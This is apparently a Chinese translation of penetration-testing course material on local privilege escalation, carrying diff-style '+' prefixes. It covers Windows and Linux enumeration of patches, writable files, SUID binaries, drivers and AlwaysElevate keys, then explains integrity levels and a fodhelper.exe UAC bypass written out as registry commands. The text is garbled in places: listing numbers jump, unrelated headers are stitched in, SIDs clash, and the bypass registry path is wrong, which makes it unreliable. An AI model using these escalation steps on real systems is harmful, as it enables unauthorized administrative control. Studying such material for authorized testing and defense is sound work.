+| Microsoft Word MUI (English) | Microsoft Corporation | 16.0.4266.1081 |
+| Microsoft Office Proofing (English) | Microsoft Corporation | 16.0.4266.1081 |
+| Microsoft Office Shared Tools 2016 | Microsoft Corporation | 16.0.4266.1081 |
+| Herramientas de corrección | Microsoft Corporation | 16.0.4266.1081 |
+| Outils de vérification | Microsoft Corporation | 16.0.4266.1081 |
+| Python | Python Software Foundation | 2.7.15 |
+| VMware Tools | VMware, Inc. | 10.30.12.496 |
+| Microsoft Visual C+ Redistributable | Microsoft Corporation | 9.0.30729
+
+> (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/32/wmic/wmic
+> (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/32/wmic/wmic-windows-start-page
+> (Microsoft, 2018), https://docs.microsoft.com/en-us/windows-versions/windows/desktop/legacy/aa394378(v=vs.85)
+> (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/what/windows-installer-portal
+
+列表 535 - 列出 Windows 上所有的应用
+
+HotFixID 和 InstalledOn 信息的组合可以为我们提供 操作系统状态的精确指示。通过此输出，该系统最近没有更新，这可能使其更容易被利用。
+
+列表 536 - 列出 Windows 上所有的补丁
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+```
+ii aduser               3.115      all add remove users group
+ii adwaita-icon-theme   3.2.0+1deb9 all default icon theme of GNOME
+ii alsa-utils           1.1.3-1      i386 Utilities for configuring and
+ii anacron              2.3-4       i386 cron like package
+ii ant                   1.9.9-1      all Java based build tool like ma
+ii ant-optional         1.9.9-1      all Java based build tool like ma
+ii apache               2.4.25-3deb9 i386 Apache HTTP Server
+ii apache2-bin         2.4.25-3deb9 i386 Apache HTTP Server (modules a
+ii apache2-data        2.4.25-3deb9 i386 Apache HTTP Server (common fi
+ii apache2-utils       2.4.25-3deb9 i386 Apache HTTP Server (utility p
+```
+
+> 列表 537 - Debian Linux 系统上的所有已安装包
+
+这证实了我们的预期：这台 Debian 机器实际上正在运行一个 Web 服务器。在这种情况下，它运行的是 `Apache2`。
+
+## 18.1.1.9 枚举可读/可写的文件和目录
+
+如前所述，访问限制不足的文件可能会导致漏洞，攻击者可以借此获得高权限。这通常发生在攻击者可以修改在特权账户上下文中执行的脚本或二进制文件时。
+
+此外，非特权用户可读取的敏感文件可能包含重要信息，例如数据库或服务帐户的硬编码凭据。
+
+由于手动检查每个文件和目录的权限不可行的，因此我们需要尽可能地自动化此任务。
+
+在 Windows 平台上，有很多程序和工具可以帮助我们自动化此任务。来自 SysInternals⁷⁵ 的 `AccessChk` 是此目的最知名且最常用的工具。
+
+在下面的示例中，我们将演示如何使用 `AccessChk` 查找 Program Files 目录下是否存在不安全的文件权限。请注意，目标二进制文件仅是为了本次练习而创建的。
+
+具体而言，我们将枚举 Program Files，寻找任何允许 `Everyone`⁷⁶ 组具有写权限的文件或目录。
+
+我们将使用 `-u` 抑制错误，使用 `-w` 搜索访问权限，使用 `-s` 执行递归搜索。由于该工具非常有用，其他选项也值得探索。
+
+```
+c:\Tools\privilege_escalation\SysInternalsuite\accesschk.exe -u "Everyone" "C:\Program Files
+```
+
+`Accesschk` v6.12 报告了可安全对象的有效权限
+
+Copyright (2006-2017) Mark Russovich www.sysinternals.com
+
+```
+RW C:\Program Files\TestApplication\testapp.exe
+```
+
+⁷⁵ (Microsoft, 2017), https://docs.microsoft.com/en-us/sysinternals/
+
+⁷⁶ (Microsoft, 2019), https://docs.microsoft.com/en-us/windows/win32/secauthz/known-sids
+
+
+
+PWK 2.0 Copyright © Offensive Security Ltd. All rights reserved. 528
+
+# 列表 538 - 列出在指定目标中识别的所有可写文件和目录
+
+在上面，`AccessChk` 成功识别出一个全员可写的可执行文件。如果该文件由特权用户或服务账户执行，我们就可以用选择的恶意文件（例如反向 shell）覆盖它，从而提升我们的权限。我们将在模块的后部分展示类似的运行示例。
+
+我们也可以使用 PowerShell 实现相同的目标。这在我们可能无法在目标系统上传输和执行任意二进制文件的情况下非常有用。
+
+PowerShell Cmdlet（下方列表 539 所示）可能看起来有些复杂，我们将引导你了解这些命令。
+
+我们使用的主要 cmdlet 是 `Get-Acl`，它检索给定文件或目录的权限。然而，由于 `Get-Acl` 可以递归执行，我们还使用了 `Get-ChildItem` cmdlet 来枚举目标目录中 Program Files 目录下的所有内容以及所有访问的权限。带有 `-match` 标志的 `AccessTo` 属性会将结果标记为我们寻找的特定访问属性。在我们的案例中，我们正在寻找任何可以被 `Everyone` 组修改（Modified）的对象。
+
+```
+PS C:\Tests\privilege_escalation\SystemInternals\Get-ChildItem "C:\Program Files" -Recurse | Get-Acl | $_.AccessToString -match "Everyone\sAllow\sModify"
+```
+
+| 路径 | 所有者 | 访问 |
+| :--- | :--- | :--- |
+| testapp.exe | BUILTIN\Administrators | Everyone Allow Modify, Synchronize... |
+
+列表 539 - 使用 PowerShell 列出指定目标中的所有可写文件和目录
+
+在这种情况下，输出与 `AccessChk` 相同。此命令允许额外的格式化选项。
+
+在 Linux 系统上，我们可以搜索目标系统上当前用户可写的任何目录。我们搜索根目录 (`/`) 并使用 `-writable` 参数来指定我们感兴趣的属性。我们还使用 `-type` 来定位目录，并重定向错误信息 `2>/dev/null`
+
+```
+studentdebian:~$ find / -writable -type d 2>/dev/null
+/usr/local/james/bin/lib
+/usr/local/james/bin/lib
+/proc/16195/task/16195/fd
+/proc/16195/fd
+/proc/16195/map
+/home/student
+/home/student/.gconf
+⁷⁷ (Linux man-pages project, 2019), http://manpages.org/linux/man-pages/find
+```
+
+/home/student/.gconf/apps
+
+/home/student/.gconf/gks
+
+/home/student/Music
+
+/home/student/Videos
+
+/home/student/Downloads
+
+/home/student/.gnup
+
+列表 540 - 列出 Linux 上所有的可写目录
+
+如上所示，包括 `/usr/local/james/bin` 在内的几个目录是全员可写的，这确实值得调查。18.1.10 枚举未挂载磁盘
+
+在大多数系统中，磁盘在启动时会自动挂载。由于这一点，很容易忘记可能包含有用信息的未挂载磁盘。我们应该寻找未挂载的磁盘，如果它们存在，请检查挂载点。
+
+在基于 Windows 的系统中，可以使用 `mount` 列出所有已挂载的磁盘以及物理连接但未挂载的磁盘。
+
+```
+c:\Users\mount
+```
+
+VolumeName 的可能值如下：
+
+```
+*** MOUNT POINTS ***
+Volume257a7f-00000000 C:\
+Volumefa0a6-3519e6f3 D:\
+```
+
+541 - 列出 Windows 上所有的驱动
+
+在这种情况下，系统有两个挂载点分别映射 C 和 D 盘。我们还注意到有一个唯一标识符 (GUID) `2572a7f-0000` 的卷，它没有挂载点。这可能很有趣，我们可能会调查一下。在 Linux 系统上，可以使用 `mount` 命令列出所有挂载的文件系统。此外，`/etc/fstab` 列出了所有启动时将挂载的磁盘。记住，系统管理员可能使用了自定义配置或脚本来挂载未在 `/etc/fstab` 文件中的磁盘。⁷⁸ (Microsoft, 2017), https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mount⁷⁹ (Linux.net, 2003), https://linux.net/man/8/mount⁸⁰ (Geek University, 2019), https://geek-university.com/linux/etc-fstab/
+
+由于这一点，扫描 `/etc/fstab` 是良好的做法，但还要收集有关挂载设备的信息。
+
+```
+student@debian:-$ cat /etc/fstab
+# /etc/fstab: 静态文件系统信息。
+
+# <file system> <mount point> <options>          dump <pass>
+# / on /dev/sd1 
+UID=f3a367a-b8fc-4cd2-95a5-9220bcc8f72 /      ext4       errors=remount-ro 0 1
+# swap on /dev/sd5 
+UID=8b7801d-e290-4d9c-b61b-b90a788150 swap      sw       0 0
+/dev/sr0                                              media/cdrom user
+
+student@debian:-$ mount
+sys on /sys type tmpfs (rw,nosuid,nodev,noexec,relime)
+proc on /proc proc (rw,nosuid,nodeexec,relime)
+udev on /dev type tmpfs (rw,nosuid,nodeexec,relime,size=58564k,nr_inodes=12616,mode=755)
+dev on /dev/pts type tmpfs (rw,nosuid,nodeexec,relime,gid=5,mode=620,umask=077)
+tmpfs on /run type tmpfs (rw,nosuid,nodeexec,relime,size=102408,mode=755)
+/dev/sd1 type ext4 (rw,relime,errors=remount-ro,data=ordered)
+security on /sys/kernel type security (rw,nosuid,nodev,relime)
+tmpfs on /dev/shm type tmpfs (rw,nosuid)
+tmpfs on /run type tmpfs (rw,nosuid,nodeexec,relime,size=5120k)
+tmpfs on /sys/fs/cgroup type tmpfs (rw,nosuid,nodev,noexec,mode=755)
+mque on /dev/mqueue type mqueue (rw,relime)
+hugetbl on /dev/hugepages type hugebfs (rw,relime)
+debugs on /sys/kernel type debugfs (rw,relime)
+tmpfs on /user type tmpfs (rw,nosuid,nodeexec,relime,size=10294k,mode=700,uid=0)
+gvfs-sd1 on /run/user/1000 type gvfs-fuse (rw,nosuid,nodev,relime,user_i=0)
+fusectl on /sys/fs/fuse/connections fusectl (rw,nosuid,nodev,relime)
+```
+
+列表 542 - 列出 Linux 上 `/etc/fstab` 的内容和所有挂载的磁盘
+
+输出显示了该 Linux 系统的单一分区和主 `ext4`。此外，我们可以使用 `lsblk` 查看所有可用设备。
+
+
+
+```
+student@debian:-$ lsblk
+NAME  MA:MIN SIZE RO TYPE MOUNTPOINT
+db0     2:0    14K 0 disk
+sda     8:0     5G 0 disk
+-sda1 8:1    4.7G 0 part /
+-sda2 8:2      0 part
+-sda5 8:5    334M 0 part [SWAP]
+```
+
+列表 543 - 所有驱动包含三个分区，并已进行编号。在某些情况下，显示系统上所有磁盘的信息可能会揭示未挂载的分区。取决于系统的配置（或配置错误），那么我们可能
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+挂载分区并搜索感兴趣的文档、凭据或其他信息，这些信息可能允许我们提升权限或在网络中获得更优立足点。
+
+## 18.1.1.11 枚举设备驱动程序和内核模块
+
+另一种常见的权限提升涉及对设备驱动程序和内核模块的利用。我们将在本模块的后续部分查看实际的执行技术，但让我们先来看看重要的枚举技术。由于这种技术依赖于将漏洞与相应的利用程序进行匹配，我们需要编译一个加载在系统上的驱动程序和内核模块列表。
+
+在 Windows 上，我们可以从 `driverquery` 命令开始搜索。我们将提供 `/v` 参数来获取详细输出，或者使用 `/f csv` 来以 CSV 格式请求输出。
+
+为了过滤输出，我们将在 `powershell` 会话中运行此命令。我们将输出通过到 `Convert-CSV` 句法（类似于 `Select-Object`），这允许我们选择特定的对象属性或对象组，如 `DisplayName`（显示名称）、`Start Mode`（启动模式）和 `Path`（路径）。
+
+```
+c:\Users\student>powershell
+PS C:\Users\student>driverquery.exe /f csv | Convert-CSV | Select-Object -DisplayName Name, 'Start Mode', Path
+```
+
+| Display Name | Start Mode | Path |
+| --- | --- | --- |
+| 1394 OHCI Host Controller | Manual | C:\Windows\system32\drivers\1394hci.sys |
+| Beware Microsoft ACPI Driver | Manual | C:\Windows\system32\drivers\3ware.sys |
+| ACPI Devices Driver | Manual | C:\Windows\system32\drivers\acpi.sys |
+| Microsoft ACPIEx Driver | Boot | C:\Windows\system32\drivers\aciex.sys |
+| ACPI Processor Aggregator Driver | Manual | C:\Windows\system32\drivers\acipagr.sys |
+| ACPI Meter Driver | Manual | C:\Windows\system32\drivers\acpim.sys |
+| ACPI Wake Alarm Driver | Manual | C:\Windows\system32\drivers\aciptime.sys |
+| ADP80XX | Manual | C:\Windows\system32\drivers\adp80xx.sys |
+
+在生成已加载驱动程序列表的同时，我们必须采取下一步来请求每个已加载驱动程序的版本。我们将使用 `Get-WmiObject` 句法获取 `Win32_PnPESignedDriver` WMI 实例，它提供了关于驱动程序的重要信息。通过将输出通过到 `Select-Object`，我们可以枚举特定的属性，包括：
+
+此外，我们可以根据如何将输出通过到 `Where-Object` 来针对性地目标驱动程序。
+
+```
+PS C:\Users\student> Get-WmiObject Win32_PnPESignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
+```
+
+| DeviceName | DriverVersion | Manufacturer |
+|---|---|---|
+| VMware HCI Host Device | 9.8.6.0 | VMware, Inc. |
+| VMware PVSCCI Controller | 1.3.10.10 | VMware, Inc. |
+| VMware SVGA 3D | 8.16.1.24 | VMware, Inc. |
+| VMware VMCI Bus Device | 9.8.6.0 | VMware, Inc. |
+| VMware Pointing Device | 12.5.7.0 | VMware, Inc. |
+
+现在我们已经有了所有加载的 VMware 设备驱动程序列表及其相应的版本号，我们可以搜索这些特定的驱动程序。
+
+在 Linux 上，我们可以使用 `lsmod` 在不带任何参数的情况下搜索已加载的内核模块。
+
+```
+student@debian:~# lsmod
+Module Size Used by
+fuse 90112 3
+apptalk 32768 0
+ax25 49512 0
+ips 28672 0
+p8023 16384 1 ipx
+p8022 16384 1 ipx
+spnap 16384 2 apptalk,ipx
+lllc 16384 2 p8022,psnap
+evdev 20480 5
+mmw_balloon 20480 0
+crc32_pcmul 16384 0
+...
+i2c_piix4 20480 0
+libata 189212 2 ata_piix,ata_generic
+scsi_mod 57324 4 sd_mod,libata,vmw
+floppy 57344 0
+```
+
+一旦我们有了已加载模块的列表并识别出我们想要信息的模块（例如示例中的 `libata`），就可以使用 `modinfo` 来查找特定模块。注意，这需要 root 权限运行。
+
+```
+student@debian:~# /sbin/modinfo libata
+filename: /lib/modules/4.9.0-kernel/drivers/ata/libata.ko
+version: 3.0
+license: GPL
+description: Library for ATA devices
+author: Jeff Garrick
+srcversion: 7D0
+depends: scsi_mod
+vermagic: Y
+magic: 4.9.0-SMP
+unload_delay: seconds (int)
+par: ...
+```
+
+与 Windows 的情况类似，在获取驱动程序列表及其版本后，我们更有可能找到可能存在的相关“捷径”。
+
+## 18.1.1.12 枚举自动提升权限的二进制文件
+
+在本模块的稍后部分，我们将探索能够自动提升权限的二进制文件。在 Windows 系统上，我们可以根据如何将输出通过到 `Where-Object` 来针对性地目标这些设置。我们可以使用 `reg query` 来检查这些设置：
+
+```
+c:\Users\student>reg query HKEY_CURRENT_USER\Software\Policies
+HKEY_CURRENT_USER\Policies\Microsoft\Installer
+AlwaysElevate REG_DWORD 1
+```
+
+```
+c:\Users\student>reg query HKEY_LOCAL_MACHINE\Software\Policies
+HKEY_LOCAL_MACHINE\Policies\Microsoft\Installer
+AlwaysElevate REG_DWORD 1
+```
+
+同样，在 Linux 系统上我们可以检查 SUID。通常情况下，运行一个可执行文件时，它会继承文件所有者的权限。如果所有者是 root，任何本地用户都将以 root 权限执行该二进制。
+
+我们可以使用 `find` 命令查找 SUID 标记的文件。在这种情况下，我们从根目录开始搜索（`-type f`），查找带有 SUID 权限的文件（`-perm -u=s`），并丢弃所有错误（`2>/dev/null`）：
+
+
+
+```
+student@debian~$ find / -perm -u=s -type f 2>/dev/null
+usr/lib/encrypt/crypt-device
+usr/lib/openssh/ssh-keys
+usr/lib/policykit-1/polkit-agent-helper
+usr/lib/dbus-1.0/daemon-launch-helper
+usr/lib/xorg/Xorg.wrap
+usr/bin/user
+usr/bin/passwd
+usr/bin/sudo
+usr/bin/chfn
+usr/bin/newgrp
+usr/bin/exec
+usr/bin/chsh
+bin/mount
+bin/su
+bin/fuser
+bin/umount
+bin/ntfs-3g
+bin/ping
+```
+
+在这种情况下，命令发现了几个 SUID 二进制文件。利用 SUID 二进制文件的方法取决于多个因素。例如，如果 `/bin/cp`（复制命令）是 SUID，我们可以复制并覆盖敏感文件如 `/etc/passwd`。
+
+### 18.1.1.13 练习
+
+- 1. 在你的专用 Windows 和 Linux 客户端上执行本节涵盖的手动枚举方法。尝试实验本节使用的工具和命令的各种选项。
+
+### 18.1.2 自动化枚举
+
+显然，每个操作系统都包含可以进一步攻击的丰富信息。无论目标操作系统是什么，手动收集这些信息都是非常耗时。幸运的是，我们可以使用各种脚本来自动化此过程。
+
+在 Windows 上，每个脚本是 `windows-privesc-check`，可以在 `windows-privesc-check` GitHub 仓库中找到。该仓库已经包含一个由 Installer 生成 Windows 可执行文件，也可以根据需要重新构建。
+
+```
+带有 -h 标志运行检查会显示以下菜单：
+c:\Tools\privilege_escalation\windows-privesc-check-master>windows-privesc-check.exe -h
+```
+
+# windows-privresc-check v2.0 (http://pentestmonkey.net/windows-privresc-check)
+
+用法: `windows_privresc_check.exe [--dump [ dump opts]] | --dumptab | --audit] examine opts [host opts] -o report-file-system`
+
+选项:
+
+- - `--version` 显示程序版本号并退出
+
+- -h,--help 显示此消息并退出
+
+- `--dump` 导出信息供你手动分析
+
+- `--dumptab` 以制表符分隔的格式导出
+
+- `--audit` 识别并报告安全漏洞
+
+- `--pshell` 启动交互式 python shell
+
+examine opts:
+
+至少包含以下一个项之一，以指示要检查的内容（* 表示未实现）
+
+- -a,--all 所有简单检查（非慢速）
+
+- -A,--allfiles 所有文件和目录（慢速）
+
+- -D,--drivers 驱动器
+
+- -e,--reg_keys 杂项安全相关的注册表项
+
+- -E,--events 事件日志
+
+- -INTERESTING_FILE_LIST,--INTERESTING_FILE=INTERESTING_FILE_LIST 更改行为。请查看此处
+
+- -INTERESTING_FILE,--INTERESTING_FILE 更改行为。请查看此处。每行一个
+
+- -G,--groups 组
+
+- -H,--shares 共享文件夹
+
+- -I,--installed_software 安装的软件
+
+- -j,--tasks 计划任务
+
+- -k,--drivers 内内核驱动程序
+
+列表 550 - 由 PyInstaller 生成的可执行文件输出
+
+此工具接受许多选项，但我们将通过一些示例。首先，我们将列出系统中关于组的信息。我们将解释自而其明的 `--dump` 以查看输出，并使用 `-G` 来列出组。
+
+```
+c:\Tools\privilege_escalation\windows-privresc-check-master>windows-privresc-check2.exe
+--dump -G
+windows-privresc-check v2.0 (http://pentestmonkey.net/windows-privresc-check)
+```
+
+[i] UserEnabled 注册表值为 0。排除终端服务器 (TERMINAL SERVER)
+
+将这些用户视为可信的：
+
+* BUILTIN\Power Users
+
+* BUILTIN\Administrators
+
+* NT SERVICE\InstalledInstaller
+
+* NT AUTHORITY\SYSTEM
+
+[i] 以当前用户身份运行。未提供登录凭据 (-u, -D, -p)。
+
+```
+========== Starting Audit at 2019-09-22 12:45:56 ==========
+```
+
+# 运行: dump_misc_checks
+
+- - [+] 正在运行: dump_groups
+
+[+] 主机不在域
+
+[+] 检查完成
+
+导出组列表：
+
+BUILTIN\Administrators 成员：CLIENT251\Administrator
+
+BUILTIN\Administrators 成员：CLIENT251\admin
+
+BUILTIN\Administrators 成员：[unknown]\S-5-S-21-271534670-1758985447-1278008508
+
+BUILTIN\Users 成员：[unknown]\S-5-S-21-271534670-1758985447-1278008508
+
+BUILTIN\Guests 成员：CLIENT251\Guest
+
+BUILTIN\IIS_USERS 成员：NT AUTHORITY\IUSRS
+
+BUILTIN\Remote Desktop Users 成员：CLIENT251\student
+
+BUILTIN\Users 成员：NT AUTHORITY\Authenticated Users
+
+BUILTIN\Users 成员：CLIENT251\student
+
+BUILTIN\Users 成员：[unknown]\S-5-S-21-271534670-1758985447-1278008508-513
+
+[+] 检查完成
+
+列表 551 - windows-privesc-check
+
+脚本成功执行，向我们展示了系统中安全组的信息。
+
+由于 Windows 上有 `windows-privesc-check`，我们也可以在 Linux 等 Unix 派生系统在使用 `unix_privesc_check492`。我们可以通过不带任何参数运行脚本来查看帮助信息。
+
+```
+student@debian:~$ /unix-privesc-check
+unix-privesc-check v1.4 ( http://pentestmonkey.net/tools/unix-privesc-check )
+用法: unix-privesc-check { standard | detailed }
+
+"standard" 模式：对大量安全设置进行速度优化的检查。
+
+"detailed" 模式：与标准模式相同，还会检查打开的文件句柄和调用的文件（例如从 shell 脚本解析出的、.so 文件）。此模式较慢且容易产生误报，但可能帮助你发现第三方程序中细微的缺陷。
+```
+
+此脚本检查了可能允许本地用户提升权限的权限和其他设置。
+
+列表 552 - 运行 unix_privesc_check
+
+如上面的列表所示，脚本支持 `"standard"`（标准）模式和 `"detailed"`（详细）模式。根据所提供的信息，标准模式似乎执行了速度优化的过程，应该提供更少的误报。因此，在接下来的示例中，我们将使用标准模式并将整个输出重定向到名为 `output.txt` 的文件中。
+
+```
+student@debian:~$ /unix-privesc-check > output.txt
+```
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+# 攻击性安全 (OFFENSIVE SECURITY)
+
+www.offensive-security.com
+
+脚本对常用文件的权限进行了大量检查。例如，以下异常揭示了非 root 用户可写入的配置文件：
+
+```
+正在检查可写文件
+正在检查 root 是否可以更改 /etc/passwd
+警告：/etc/passwd 是一个关键文件。检查 root 是否可以更改 /etc/passwd
+检查 root 是否可以更改 /etc/group
+检查 root 是否可以更改 /etc/fstab
+检查 root 是否可以更改 /etc/profile
+检查 root 是否可以更改 /etc/sudoers
+检查 root 是否可以更改 /etc/shadow
+```
+
+列表 554 - 可写文件可写检查
+
+
+
+此输出揭示了任何人都可以编辑 `/etc/passwd` 文件！这很重要，因为它允许攻击者轻松地提升权限或创建账户。尽管这些工具执行了自动化检查，但请注意每个系统都是不同的，且更改会被这些工具捕获。
+
+### 18.2.1 练习
+
+1. 使用本节介绍的工具和命令检查 Windows 和 Linux，以熟悉技术。
+2. 不同的 `windows-privesc-check` 选项。
+
+## 18.2 Windows 权限提升
+
+在本节中，我们将讨论 Windows 权限、完整性机制以及利用内核漏洞、UAC 绕过和未引号路径来提升权限。
+
+### 18.2.1 理解 Windows 权限和完整性级别
+
+在 Windows 系统上，为了使权限生效，Windows 使用称为令牌的对象。一旦用户通过身份验证，Windows 就会生成包含各种信息的令牌，描述用户的上下文。最后，这些令牌需要唯一标识。这是通过安全标识符 `SID` 实现的，它是分配给每个对象（如用户或组）的唯一值。这些 `SID` 由 Windows 本地体系生成并维护。除了权限外，Windows 还实现了所谓的完整性机制。这是通过为应用程序进程和安全对象分配完整性级别来实现的核心组件。简单来说，这描述了操作系统对运行的应用或安全对象的信任程度。例如，配置的完整性级别决定了可以执行哪些操作，API 也可以被特定的完整性级别阻止。
+
+从 Vista 开始，进程运行在四个完整性级别上：
+
+- 系统完整性进程：`SYSTEM` 权限
+- 高完整性进程：管理员权限
+- 中完整性进程：标准用户权限
+- 低完整性进程：通常用于沙箱的高度限制权限
+
+### 18.2.2 用户账户控制 (UAC) 简介
+
+用户账户控制 `UAC` 是微软在 Windows Vista 和 Windows Server 2008 中引入的访问控制系统。虽然 `UAC` 已经被讨论和研究了很长时间，但重要的是，微软并不认为它是一个安全边界。相反，`UAC` 强制应用程序在非管理员账户的上下文中运行，除非管理员授权提升。它会阻止未经授权的应用程序在没有权限的情况下运行，并阻止更改设置。通常情况下，`UAC` 的效果是任何想要执行对系统产生潜在影响的操作的操作都无法静默执行。至少在-UAC 有两种不同的模式：凭据提示和许可提示。程序相当简单。当标准用户想要执行管理任务（如安装新应用程序）且启用了 `UAC` 时，用户将看到凭据提示。
+
+# 攻击性安全
+
+## 使用 Kali Linux 进行渗透测试 2.0
+
+会弹出一个确认提示。在这种情况下，用户只需确认应完成任务，无需重新输入用户凭据。
+
+例如，在下面的示例中，标准用户账户下运行的 Windows 命令处理器正尝试执行特权操作。`UAC` 根据其通知设置⁵⁰（在此情况下为“始终通知”）运行，暂停目标进程 `cmd.exe`，并提示管理员用户名和密码以执行请求的特权操作。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_539_0.png)
+
+图 275：请求管理员密码的 UAC 对话
+
+当以管理员用户登录时，该账户将有两个安全令牌：一个运行在中等完整级别，另一个运行在高完整级别。`UAC` 充当这两个完整级别之间的隔离机制。
+
+为了查看完整级别的运作，让我们先以管理员用户登录，打开命令提示符并运行 `whoami /groups` 命令：
+
+```
+c:\Users\admin>whoami /groups
+
+GROUP INFORMATION
+--------------------
+Group Name                     Type                SID               Attributes
+=================================================================
+Everyone                       Well-known group S-1-1-0     Mandatory group,
+AUTHORITY\Local account and member Well-known group S-1-5-114 Group used for de-identification
+```
+
+⁵⁰ (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-controls
+
+| Name | Alias | SID | Attributes |
+| --- | --- | --- | --- |
+| BUILTIN\Administrators | | S-1-5-32-54 | 用于管理任务的组 |
+| BUILTIN\Users | | S-1-5-32-54 | 强制性组 |
+| NT AUTHORITY\INTERACTIVE | Well-known group | S-1-5-4 | 强制性组 |
+| CONSOLE LOGON | Well-known group | S-1-2-1 | 强制性组 |
+| NT AUTHORITY\Authentic Users | Well-known group | S-1-5-11 | 强制性组 |
+| NT AUTHORITY\Organization | Well-known group | S-1-5-15 | 强制性组 |
+| NT AUTHORITY\Local account | Well-known group | S-1-5-113 | 强制性组 |
+| LOCAL | Well-known group | S-1-2-0 | 强制性组 |
+| NT AUTHORITY\Local Authentication | Well-known group | S-1-5-64-10 | 强制性组 |
+| Mandatory Label\Medium Level | Label | S-1-16-8192 | |
+
+#### 555 - 检查完整级别
+
+如输出行所示，此提示符目前运行在中等完整级别上。
+
+让我们尝试使用此命令提示符更改管理员的密码：
+
+```
+C:\Users\admin> net user admin Ev!pass
+System error 5 has occurred.
+```
+
+拒绝访问。
+
+尽管我们已以管理员用户登录，请求仍被拒绝了。
+
+为了更改用户密码，即使我们以管理员账户登录，也必须切换到高完整级别。例如，一种方法是使用 `powershell.exe` 配合 `Start-Process cmd.exe -Verb "Run as administrator"`：
+
+```
+C:\Users\admin>powershell.exe Start-Process cmd.exe -Verb runas
+```
+
+#### 557 - 使用命令生成具有高完整性的 cmd.exe 进程
+
+在提交此操作并接受 `UAC` 提示后，我们将看到一个新的高完整性 `cmd.exe` 进程。
+
+让我们使用 `whoami /groups` 参数检查完整级别以更改密码：
+
+```
+C:\Windows\System32> whoami /groups
+GROUP INFORMATION
+```
+
+| Name | Type | SID | Attributes |
+| --- | --- | --- | --- |
+| Everyone | Well-known group | S-1-5-1 | 强制性组 |
+| NT AUTHORITY\Local account and member | Well-known group | S-1-5-114 | 强制性组 |
+| BUILTIN\Administrators | Alias | S-1-5-32-54 | 强制性组 |
+| BUILTIN\Users | Alias | S-1-5-32-54 | 强制性组 |
+| NT AUTHORITY\INTERACTIVE | Well-known group | S-1-5-4 | 强制性组 |
+| CONSOLE LOGON | Well-known group | S-1-2-1 | 强制性组 |
+| NT AUTHORITY\Authenticated Users | Well-known group | S-1-5-11 | 强制性组 |
+| NT AUTHORITY\This Organization | Well-known group | S-1-5-15 | 强制性组 |
+| NT AUTHORITY\Local account | Well-known group | S-1-5-113 | 强制性组 |
+| NT AUTHORITY\Local Authentication | Well-known group | S-1-2-0 | 强制性组 |
+| Mandatory High Mandatory Level | Well-known group | S-1-16-8192 | 强制性组 |
+
+
+
+| Label | | S-1-15-12288 | |
+
+```
+C:\windows\system32> net user admin Evil
+The command completed successfully.
+```
+
+列表 558 - 在生成具有高完整性的 `cmd.exe` 后成功更改管理员用户的密码
+
+这次，我们运行在高完整级别上，密码更改成功了。
+
+## 18.2.3 用户账户控制 (UAC) 绕过：`fodhelper.exe` 案例研究
+
+UAC 可以通过多种方式绕过。在第一个示例中，我们将演示一种允许管理员用户通过静默将我们的完整级别从中等提升到高来绕过 UAC。
+
+大多数公开知的 UAC 绕过技术利用了特定的自动提升二进制文件。在这种情况下，我们使用 `fodhelper.exe`，它是一个合法的 Windows 二进制文件，可以在不提示用户的情况下以高完整性运行。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_541_0.png)
+
+该技术有效是因为 `fodhelper.exe` 会查找特定的注册表项来执行。通过创建此项，我们可以强制二进制文件运行我们的恶意载荷。
+
+```cmd
+reg add "HKCU\Software\Classes\ms-fodhelper\userv" /t REG_SZ /d "cmd.exe /c here" /f
+reg add "HKCU\Software\Classes\ms-fodhelper\userv\shell\command" /t REG_SZ /d "cmd.exe" /f
+fodhelper
+```
+
+运行 `fodhelper` 后，它将以高完整性执行 `cmd.exe`。从那里，我们可以执行任何管理员操作，包括：
+
+```cmd
+reg delete "HKCU\Software\Classes\ms-fodhelper" /f
+```
+
+# 攻性安全：使用 Kali Linux 2.0 进行渗透
+
+| 文件版本: 10.0.16299.15 (WinBuild.160101.08800) |
+
+| 机器类型: 32位 |
+
+| 二进制版本: 10.0.16299.15 |
+
+| 原始名称: Fodhelper.EXE |
+
+| 内部名称: Fodhelper |
+
+| 版权: Microsoft Corporation 保留所有权利。 |
+
+| 注释: n/a |
+
+| 熵: 6.386 |
+
+| 清单: - |
+
+```xml
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!-- (c) Microsoft Corporation -->
+<assembly
+  xmlns="urn:schemas-microsoft-com:asm.v1"
+  xmlns:asmv3="urn:schemas-microsoft-com:asm.v3"
+  manifestVersion="1.0">
+  <assemblyIdentity type="win32" publicKeyToken="6559b64144cc11df"
+    name="Microsoft.Windows.Fodhelper" version="5.1.0.0"
+    processorArchitecture="x86" />
+  <description>Features On Demand Help UI</description>
+  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
+    <security>
+      <requestedPrivileges>
+        <requestedExecutionLevel level="requireAdministrator" />
+      </requestedPrivileges>
+    </security>
+  </trustInfo>
+  <asmv3>
+    <application>
+      <windowsSettings xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings">
+        <dpiAware>true</dpiAware>
+        <autoElevate>true</autoElevate>
+      </windowsSettings>
+    </application>
+  </asmv3>
+</assembly>
+```
+
+列表 559 - 使用 `sigcheck` exe 检查 `fodhelper.exe` 的应用程序清单
+
+快速查看结果显示该应用程序旨在由管理员用户运行，因此需要完整的管理员访问令牌。此外，`autoelevate` 标志被设置为 `true`，这允许可执行文件在不提示管理员用户同意的情况下自动提升到*高完整性*。
+
+我们可以使用 Sysinternals 套件中的 Process Monitor 来获取有关该工具执行过程的更多信息。
+
+> ⁴ (Microsoft, 2010), msdn.microsoft.com/en-us/library/bb756929.aspx
+
+> ⁵ (Microsoft, 2016), technet.microsoft.com/en-us/library/2009.07.uacsp
+
+> ⁶ (Microsoft, 2019), docs.microsoft.com/en-us/sysinternals/downloads/procmon
+
+当我们的目标是理解特定进程如何与文件系统和 Windows 注册表交互时，Process Monitor 是非常有价值的工具。它是识别注册表劫持、DLL 劫持等缺陷的优秀工具。
+
